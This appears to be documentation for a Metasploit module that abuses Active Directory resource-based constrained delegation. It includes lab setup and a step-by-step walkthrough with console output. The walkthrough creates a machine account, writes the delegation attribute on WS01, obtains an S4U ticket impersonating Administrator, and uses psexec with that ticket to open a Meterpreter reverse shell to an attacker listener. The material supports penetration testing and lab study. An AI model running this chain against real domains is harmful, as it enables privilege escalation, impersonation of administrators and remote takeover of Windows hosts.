## RBCD Exploitation

If an account has the ability to write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute against a target, i.e. having
`GenericWrite` privileges, this can be abused for privilege escalation.

The `auxiliary/admin/ldap/rbcd` module can be used to read and write the `msDS-AllowedToActOnBehalfOfOtherIdentity` LDAP attribute against a target
for Role Based Constrained Delegation (RBCD). When writing, the module will add an access control entry (ACE) to allow the account specified in
`DELEGATE_FROM` to the object specified in `DELEGATE_TO`. For privilege escalation - the `auxiliary/admin/kerberos/get_ticket` module can then
be used to request a new Kerberos S4U impersonation ticket for the Administrator account.

In order for the `auxiliary/admin/ldap/rbcd` module to succeed, the authenticated user must have write access to the target object (the object specified in `DELEGATE_TO`).

## Lab setup

For the RBCD attack to work an Active Directory account (i.e. `sandy`) is required with write privileges to the target computer (i.e. `WS01`).

From an admin powershell prompt, first create a new Active Directory account, `sandy`, in your Active Directory environment:

```powershell
# Create a basic user account
net user /add sandy Password1!

# Mark the sandy and password as never expiring, to ensure the lab setup still works in the future
net user sandy /expires:never
Set-AdUser -Identity sandy -PasswordNeverExpires:$true
```

Grant Write privileges for sandy to the target machine, i.e. `WS01`:

```powershell
# Remember to change WS01 to the name of your target Computer (i.e. the output of the hostname command)
$TargetComputer = Get-ADComputer 'WS01'
$User = Get-ADUser 'sandy'

# Add GenericWrite access to the user against the target computer
$Rights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
$ControlType = [System.Security.AccessControl.AccessControlType] "Allow"
$InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$GenericWriteAce = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $User.Sid,$Rights,$ControlType,$InheritanceType
$TargetComputerAcl = Get-Acl "AD:$($TargetComputer.DistinguishedName)"
$TargetComputerAcl.AddAccessRule($GenericWriteAce)
Set-Acl -AclObject $TargetComputerAcl -Path "AD:$($TargetComputer.DistinguishedName)"
```

Finally Verify the Write privileges for the sandy account:

```powershell
PS C:\Users\administrator> $TargetComputer = Get-ADComputer 'WS01'
PS C:\Users\administrator> (Get-ACL "AD:$($TargetComputer.DistinguishedName)").Access| Where-Object { $_.IdentityReference -Match 'sandy' }

ActiveDirectoryRights : GenericWrite
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : MSFLAB\sandy
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

## Module usage

The `admin/dcerpc/samr_computer` module is generally used to first create a computer account, which requires no permissions:

1. From msfconsole
2. Do: `use auxiliary/admin/dcerpc/samr_computer`
3. Set the `RHOSTS`, `SMBUser` and `SMBPass` options
   a. For the `ADD_COMPUTER` action, if you don't specify `COMPUTER_NAME` or `COMPUTER_PASSWORD` - one will be generated automatically
   b. For the `DELETE_COMPUTER` action, set the `COMPUTER_NAME` option
   c. For the `LOOKUP_COMPUTER` action, set the `COMPUTER_NAME` option
4. Run the module and see that a new machine account was added

Then the `auxiliary/admin/ldap/rbcd` can be used:

1. Set the `RHOST` value to a target domain controller
2. Set the `USERNAME` and `PASSWORD` information to an account with the necessary privileges
3. Set the `DELEGATE_TO` and `DELEGATE_FROM` data store options
4. Use the `WRITE` action to configure the target for RBCD

See the Scenarios for a more detailed walk through

## Actions

### FLUSH
Delete the security descriptor. Unlike the REMOVE action, this deletes the entire security descriptor instead of just
the matching ACEs.

### READ
Read the security descriptor and print the ACL contents to identify objects that are currently configured for RBCD.

### REMOVE
Remove matching ACEs from the security descriptor DACL. Unlike the FLUSH action, this only removes the matching ACEs
instead of deleting the entire security descriptor.

### WRITE
Add an ACE to the security descriptor DACL to enable RBCD. The new entry will be appended to the ACL after any existing
ACEs. No changes are made to the security descriptor if the ACE to enable RBCD already exists.

## Options

### DELEGATE_TO
The delegation target. This is the object whose ACL is the target of the ACTION (read, write, etc.). The authenticated
user must have write access to this object.

### DELEGATE_FROM
The delegation source. This is the object which is added to (if action is WRITE) or removed from (if action is REMOVE)
the delegation target.

## Scenarios

### Window Server 2019 Domain Controller

In the following example the user `MSFLAB\sandy` has write access to the computer account `WS01$`. The sandy account is
used to add a new computer account to the domain, then configures `WS01$` for delegation from the new computer account.

The new computer account can then impersonate any user, including domain administrators, on `WS01$` by authenticating
with the Service for User (S4U) Kerberos extension.

First create the computer account:

```msf
msf6 auxiliary(admin/dcerpc/samr_computer) > show options

Module options (auxiliary/admin/dcerpc/samr_computer):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   COMPUTER_NAME                       no        The computer name
   COMPUTER_PASSWORD                   no        The password for the new computer
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              445              yes       The target port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   ADD_COMPUTER  Add a computer account


msf6 auxiliary(admin/dcerpc/samr_computer) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBUser sandy
SMBUser => sandy
msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(admin/dcerpc/samr_computer) > run
[*] Running module against 192.168.159.10

[*] 192.168.159.10:445 - Using automatically identified domain: MSFLAB
[+] 192.168.159.10:445 - Successfully created MSFLAB\DESKTOP-QLSTR9NW$
[+] 192.168.159.10:445 -   Password: A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT
[+] 192.168.159.10:445 -   SID:      S-1-5-21-3402587289-1488798532-3618296993-1655
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/samr_computer) > use auxiliary/admin/ldap/rbcd
```

Now use the RBCD module to read the current value of `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```msf
msf6 auxiliary(admin/ldap/rbcd) > set USERNAME sandy@msflab.local
BIND_DN => sandy@msflab.local
msf6 auxiliary(admin/ldap/rbcd) > set PASSWORD Password1!
BIND_PW => Password1!
msf6 auxiliary(admin/ldap/rbcd) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_TO WS01$
DELEGATE_TO => WS01$
msf6 auxiliary(admin/ldap/rbcd) > read
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[*] The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.
[*] Auxiliary module execution completed
```

Writing a new `msDS-AllowedToActOnBehalfOfOtherIdentity` value using the computer account created by `admin/dcerpc/samr_computer`:

```msf
msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_FROM DESKTOP-QLSTR9NW$
DELEGATE_FROM => DESKTOP-QLSTR9NW$
msf6 auxiliary(admin/ldap/rbcd) > write
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
[*] Auxiliary module execution completed
```

Reading the value of `msDS-AllowedToActOnBehalfOfOtherIdentity` to verify the value is updated:

```msf
msf6 auxiliary(admin/ldap/rbcd) > read
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[*] Allowed accounts:
[*]   DESKTOP-QLSTR9NW$ (S-1-5-21-3402587289-1488798532-3618296993-1655)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/rbcd) >
```

Next we can use the `auxiliary/admin/kerberos/get_ticket` module to request a new S4U impersonation ticket for the Administrator
account using the previously created machine account. For instance requesting a service ticket for SMB access:

```msf
msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.159.10 username=DESKTOP-QLSTR9NW password=A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT domain=msflab.local spn=cifs/ws01.msflab.local impersonate=Administrator
[*] Running module against 192.168.159.10

[+] 192.168.159.10:88 - Received a valid TGT-Response
[*] 192.168.159.10:88 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_533930.bin
[*] 192.168.159.10:88 - Getting TGS impersonating Administrator@msflab.local (SPN: cifs/ws01.msflab.local)
[+] 192.168.159.10:88 - Received a valid TGS-Response
[*] 192.168.159.10:88 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_962080.bin
[+] 192.168.159.10:88 - Received a valid TGS-Response
[*] 192.168.159.10:88 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_614556.bin
[*] Auxiliary module execution completed
```

The saved TGS can be used in a pass-the-ticket style attack. For instance using the `exploit/windows/smb/psexec` module for a reverse shell:

```msf
msf6 exploit(windows/smb/psexec) > run lhost=192.168.123.1 rhost=192.168.159.10 username=Administrator smb::auth=kerberos smb::rhostname=ws01.msflab.local domaincontrollerrhost=192.168.159.10 smbdomain=msflab.local smb::krb5ccname=/Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_614556.bin

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] 192.168.159.10:445 - Connecting to the server...
[*] 192.168.159.10:445 - Authenticating to 192.168.159.10:445|msflab.local as user 'Administrator'...
[*] 192.168.159.10:445 - Loaded a credential from ticket file: /Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_614556.bin
[*] 192.168.159.10:445 - Selecting PowerShell target
[*] 192.168.159.10:445 - Executing the payload...
[+] 192.168.159.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.159.10
[*] Meterpreter session 3 opened (192.168.123.1:4444 -> 192.168.159.10:60755) at 2023-02-22 10:00:01 +0000

meterpreter >
```
